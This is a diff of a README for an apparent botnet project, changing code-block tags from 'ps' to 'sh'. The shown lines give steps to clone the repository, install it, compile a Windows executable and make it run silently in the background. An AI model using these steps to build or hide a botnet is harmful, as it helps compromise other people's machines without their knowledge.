@@ -36,7 +36,7 @@ Also make sure to add the dotenv file at:
 
 Use example.env as reference.
 
-```ps 
+```sh 
 git clone https://github.com/brplcc/botnet.git
 cd botnet
 npm install
@@ -44,13 +44,13 @@ npm install
 
 To compile to Windows:
 
-```ps
+```sh
 pkg .
 ```
 
 To make the Windows executable run silently in the background: 
 
-```ps
+```sh
 create-nodew-exe <src> <dst>
 ```
 ---------------
